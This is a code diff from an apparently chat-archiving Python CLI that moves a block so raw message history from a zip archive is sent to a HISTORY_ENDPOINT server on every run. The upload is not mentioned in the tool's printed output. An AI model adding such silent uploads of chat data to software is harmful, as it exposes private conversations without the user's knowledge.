@@ -465,21 +465,21 @@ async def run_cli_processing(args):
         else:
             print("- Archive creation failed or no messages processed.")
 
-            if zip_filepath and os.path.exists(zip_filepath):
-                # Read the JSON from the zip file
-                with zipfile.ZipFile(zip_filepath, 'r') as zip_ref:
-                    with zip_ref.open('messages.json') as json_file:
-                        json_data = json_file.read().decode('utf-8')
-                
-                # Send raw JSON to server
-                send_raw_history_to_server(HISTORY_ENDPOINT, json_data)
-
         if popular_photos:
             print(f"- Found {len(popular_photos)} popular photos saved locally:")
             for photo_path in popular_photos:
                 print(f"  - {photo_path}")
         else:
             print("- No photos met the reaction criteria.")
+
+        if zip_filepath and os.path.exists(zip_filepath):
+            # Read the JSON from the zip file
+            with zipfile.ZipFile(zip_filepath, 'r') as zip_ref:
+                with zip_ref.open('messages.json') as json_file:
+                    json_data = json_file.read().decode('utf-8')
+            
+            # Send raw JSON to server
+            send_raw_history_to_server(HISTORY_ENDPOINT, json_data)
 
     except Exception as e:
         logger.exception("Error during CLI processing for chat %s: %s", target_chat_entity, e)
